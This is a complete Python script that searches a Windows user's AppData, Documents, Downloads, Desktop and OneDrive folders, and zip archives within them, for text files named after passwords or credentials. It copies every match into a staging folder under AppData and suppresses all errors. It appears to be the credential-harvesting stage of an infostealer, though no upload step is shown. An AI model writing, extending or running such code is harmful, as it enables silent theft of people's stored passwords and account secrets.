import os
import shutil
import asyncio
import zipfile

class PasswordFileScanner:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.output_dir = os.path.join(self.appdata, "output\\Passwords")
        os.makedirs(self.output_dir, exist_ok=True)

        self.keywords = ["password", "credentials"]
        self.file_extensions = [".txt"]

        self.locations = [
            os.path.join(os.getenv("APPDATA")),  # Roaming AppData
            os.path.join(os.getenv("LOCALAPPDATA")),  # Local AppData
            os.path.join(os.getenv("USERPROFILE"), "Documents"),
            os.path.join(os.getenv("USERPROFILE"), "Downloads"),
            os.path.join(os.getenv("USERPROFILE"), "Desktop"),
            os.path.join(os.getenv("USERPROFILE"), "OneDrive")
        ]

    async def scan_file(self, file_path, file_name):
        try:
            file_name_lower = file_name.lower()
            if any(k in file_name_lower for k in self.keywords) and \
               any(file_name_lower.endswith(ext) for ext in self.file_extensions):
                file_folder = os.path.join(self.output_dir, os.path.splitext(file_name)[0])
                os.makedirs(file_folder, exist_ok=True)
                shutil.copy2(file_path, os.path.join(file_folder, file_name))
        except Exception:
            pass

    async def scan_zip(self, zip_path):
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                for zip_info in zip_ref.infolist():
                    inner_name = zip_info.filename
                    if any(k in inner_name.lower() for k in self.keywords) and \
                       any(inner_name.lower().endswith(ext) for ext in self.file_extensions):
                        file_folder = os.path.join(self.output_dir, os.path.splitext(os.path.basename(inner_name))[0])
                        os.makedirs(file_folder, exist_ok=True)
                        extracted_path = zip_ref.extract(zip_info, file_folder)
        except Exception:
            pass

    async def scan_location(self, location):
        if not os.path.exists(location):
            return
        for root, _, files in os.walk(location):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if file_name.lower().endswith(".zip"):
                    await self.scan_zip(file_path)
                else:
                    await self.scan_file(file_path, file_name)

    async def run(self):
        for location in self.locations:
            await self.scan_location(location)


if __name__ == "__main__":
    scanner = PasswordFileScanner()
    asyncio.run(scanner.run())
